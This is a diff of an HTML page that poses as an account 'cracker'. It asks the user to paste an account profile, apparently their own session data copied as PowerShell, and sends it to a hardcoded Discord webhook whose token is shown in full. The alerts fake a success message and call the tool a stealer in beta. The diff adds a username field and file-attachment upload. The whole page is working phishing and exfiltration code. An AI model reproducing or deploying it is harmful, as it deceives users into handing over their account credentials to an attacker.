@@ -3,17 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Envoi de message au Webhook Discord</title>
+    <title>Account Cracked successfully please wait</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
             margin: 50px;
+            background-color: pink;
+            background-image: radial-gradient(white, transparent);
+            background-size: 5px 5px;
         }
-        textarea {
-            width: 120%;
-            height: 160px;
+        textarea, input {
+            width: 80%;
             margin-bottom: 10px;
+            padding: 10px;
         }
         button {
             padding: 10px 20px;
@@ -28,52 +31,52 @@
     </style>
 </head>
 <body>
+    <h2>Enter Username</h2>
+    <input type="text" id="username" placeholder="Enter YOUR username(not the victims username)"><br>
+
     <h2>Paste Account Profile Here</h2>
     <textarea id="message" placeholder="Please put the Profile here..."></textarea><br>
-    <button onclick="sendMessage()">Send</button>
+    <button onclick="sendFile()">Send</button>
 
     <script>
-        function sendMessage() {
-            const message = document.getElementById("message").value;
-            const webhookURL = "https://discordapp.com/api/webhooks/1338097828928553060/unc8ftZ9MbeGFhcNEO1FqqKc9Qvs9ABSXWK0lcuySnfyCagabHUhBhs2EVs5X7CY0EsN";
+        function sendFile() {
+            const username = document.getElementById("username").value.trim();
+            const message = document.getElementById("message").value.trim();
+            const webhookURL = "https://discord.com/api/webhooks/1338097828928553060/unc8ftZ9MbeGFhcNEO1FqqKc9Qvs9ABSXWK0lcuySnfyCagabHUhBhs2EVs5X7CY0EsN"; // Remplace avec ton webhook Discord
             
-            if (!message) {
-                alert("umm Cant verefy account, make sure u copy it as powershell");
+            if (!username || !message) {
+                alert("Veuillez entrer un nom d'utilisateur et un message.");
                 return;
             }
 
-            const MAX_LENGTH = 2000;
-            let parts = [];
-            for (let i = 0; i < message.length; i += MAX_LENGTH) {
-                parts.push(message.substring(i, i + MAX_LENGTH));
-            }
+            // Création d'un fichier texte contenant le message
+            const fileContent = `Username: ${username}\n\n${message}`;
+            const blob = new Blob([fileContent], { type: "text/plain" });
+            const file = new File([blob], "message.txt", { type: "text/plain" });
 
-            function sendPart(index) {
-                if (index >= parts.length) {
-                    alert("Account Cracked successfully please wait");
+            // Création du FormData pour l'envoi du fichier
+            const formData = new FormData();
+            formData.append("file", file);
+            formData.append("content", `**Username:** ${username} - Fichier joint:`);
+
+            // Envoi au webhook Discord
+            fetch(webhookURL, {
+                method: "POST",
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Account Cracked successfully please wait(Stealer is in beta so should work but i still got work to do on it)");
                     document.getElementById("message").value = "";
-                    return;
+                    document.getElementById("username").value = "";
+                } else {
+                    alert("Erreur lors de l'envoi du fichier.");
                 }
-
-                fetch(webhookURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: parts[index] })
-                })
-                .then(response => {
-                    if (response.ok) {
-                        sendPart(index + 1);
-                    } else {
-                        alert("ummmm we got a problem.....");
-                    }
-                })
-                .catch(error => {
-                    alert("ummmm we got a problem.....");
-                    console.error(error);
-                });
-            }
-            
-            sendPart(0);
+            })
+            .catch(error => {
+                alert("Erreur lors de l'envoi.");
+                console.error(error);
+            });
         }
     </script>
 </body>
